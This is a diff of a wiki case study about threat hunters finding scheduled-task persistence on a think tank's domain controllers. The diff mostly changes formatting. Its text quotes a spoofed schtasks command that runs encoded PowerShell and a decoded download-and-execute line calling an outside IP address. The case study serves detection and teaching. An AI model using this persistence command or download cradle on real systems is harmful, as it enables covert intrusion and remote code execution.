@@ -15,6 +15,7 @@ Sentinel Intelligence is a 600-person think tank specializing in geopolitical an
 Sentinel's threat hunting team, led by Sarah Chen, immediately began a [[hypothesis-driven-hunting]] engagement using the [[mitre-attck-framework]]. Sarah formulated a hypothesis: "If a nation-state actor has gained persistent access to our network, they likely used living-off-the-land techniques to avoid detection by traditional antivirus."
 
 Living-off-the-land means using legitimate operating system tools (PowerShell, cmd.exe, WMI, Task Scheduler, Registry Editor) rather than custom malware. These tools are blessed by Microsoft, signed by Microsoft, and commonly used by system administrators—making them nearly invisible to traditional endpoint security tools. The MITRE ATT&CK framework lists multiple living-off-the-land persistence techniques:
+
 - Scheduled Task/Job (T1053)
 - Registry Run Keys (T1547.001)
 - Startup Folder (T1547.005)
@@ -25,6 +26,7 @@ Sarah hypothesized that a sophisticated nation-state actor would use **Scheduled
 Sarah's hunting team began by querying the EDR system for Scheduled Task creation events on domain controllers (high-value targets). The query looked for: (1) Task creation events, (2) tasks with hidden or suspicious names, (3) tasks that execute PowerShell or cmd.exe, (4) tasks created in the past 6 months.
 
 The EDR system returned 23 scheduled task creation events on the 6 domain controllers. Most were expected system tasks created during updates or patches. But 4 events stood out:
+
 - `C:\Windows\System32\schtasks.exe /create /tn "\Microsoft\Windows\WindowsUpdate\CheckupTask" /tr "C:\Windows\System32\cmd.exe /c powershell -e <BASE64_ENCODED_COMMAND>" /sc daily /st 02:00`
 
 The task names were spoofed to look like legitimate Windows Update tasks (using the backslash-based namespace to create nested folder structure). But the payload was encoded PowerShell.
@@ -38,6 +40,7 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://149.154.167.91:8080/
 This is a classic PowerShell download-and-execute pattern: download code from an attacker-controlled server and execute it immediately in memory. The IP address (149.154.167.91) had no legitimate business purpose for Sentinel.
 
 The threat hunting team, having found the persistence mechanism, immediately escalated to incident response. They:
+
 1. Isolated the 4 compromised domain controllers from the network
 2. Captured full memory images for forensic analysis
 3. Identified the command-and-control (C2) server (149.154.167.91) and confirmed it matched known PLA infrastructure
@@ -50,8 +53,8 @@ The attack had been in place for 47 days before being discovered through threat 
 
 ## What Went Right
 
-- **[[Hypothesis-driven-hunting]] using [[mitre-attck-framework]]**: Rather than running automated detection rules (which might miss living-off-the-land techniques), Sarah formulated a specific hypothesis about the attacker's tactics and hunted for evidence of those tactics.
-- **[[Advisary-emulation]]**: Sarah understood how nation-state actors think (they prefer persistence that survives reboots, they use legitimate tools to avoid detection) and hunted specifically for those patterns.
+- **Hypothesis-driven-hunting using [[mitre-attck-framework]]**: Rather than running automated detection rules (which might miss living-off-the-land techniques), Sarah formulated a specific hypothesis about the attacker's tactics and hunted for evidence of those tactics.
+- **Advisary-emulation**: Sarah understood how nation-state actors think (they prefer persistence that survives reboots, they use legitimate tools to avoid detection) and hunted specifically for those patterns.
 - **Domain controller focus**: Threat hunters prioritized high-value targets (domain controllers) rather than hunting broadly across all endpoints, enabling faster discovery.
 - **Encoded command detection**: Sarah's team looked for PowerShell commands with base64 encoding, which is a common evasion technique but relatively rare in normal system administration.
 - **EDR [[data-sources]]**: The EDR system collected scheduled task creation events, which are essential for detecting this persistence technique.
@@ -66,12 +69,12 @@ The attack had been in place for 47 days before being discovered through threat 
 
 ## Key Takeaways
 
-- **[[Hypothesis-driven-hunting]] based on [[mitre-attck-framework]] is more effective than rule-based detection**: Formulate hypotheses about what an attacker would do in your environment, then hunt for evidence of those behaviors. The MITRE ATT&CK framework provides a taxonomy of attacker behaviors.
+- **Hypothesis-driven-hunting based on [[mitre-attck-framework]] is more effective than rule-based detection**: Formulate hypotheses about what an attacker would do in your environment, then hunt for evidence of those behaviors. The MITRE ATT&CK framework provides a taxonomy of attacker behaviors.
 - **Living-off-the-land techniques are invisible to traditional antivirus**: Antivirus looks for malware signatures. But when an attacker uses legitimate OS tools (PowerShell, cmd.exe, Task Scheduler), they blend in with normal system administration. [[threat-hunting]] and [[behavioral-analysis]] are necessary to detect these techniques.
-- **[[Advisary-emulation]] enables focused hunting**: Understanding your most likely adversaries (nation-states targeting your industry, criminal groups, insider threats) allows you to hunt for their specific tradecraft. The PLA's known preference for persistence via scheduled tasks made the hunt focused and effective.
-- **[[Threat-intelligence-integration]] accelerates hunting**: Knowing which techniques nation-state actors have been observed using in previous campaigns allows your threat hunting team to prioritize their search.
-- **Domain controllers and other [[high-value-targets]] should be hunted intensively**: If an attacker can compromise a domain controller, they essentially own the entire network. Hunting on domain controllers is high-impact.
-- **[[Indicators-of-attack-ioa]] are more durable than [[indicators-of-compromise]]**: IOCs (specific IP addresses, malware hashes) change frequently. IOAs (the behavior pattern of downloading encoded PowerShell from the internet) persist across different threat actor campaigns.
+- **Advisary-emulation enables focused hunting**: Understanding your most likely adversaries (nation-states targeting your industry, criminal groups, insider threats) allows you to hunt for their specific tradecraft. The PLA's known preference for persistence via scheduled tasks made the hunt focused and effective.
+- **Threat-intelligence-integration accelerates hunting**: Knowing which techniques nation-state actors have been observed using in previous campaigns allows your threat hunting team to prioritize their search.
+- **Domain controllers and other high-value-targets should be hunted intensively**: If an attacker can compromise a domain controller, they essentially own the entire network. Hunting on domain controllers is high-impact.
+- **Indicators-of-attack-ioa are more durable than [[indicators-of-compromise]]**: IOCs (specific IP addresses, malware hashes) change frequently. IOAs (the behavior pattern of downloading encoded PowerShell from the internet) persist across different threat actor campaigns.
 
 ## Related Cases
 
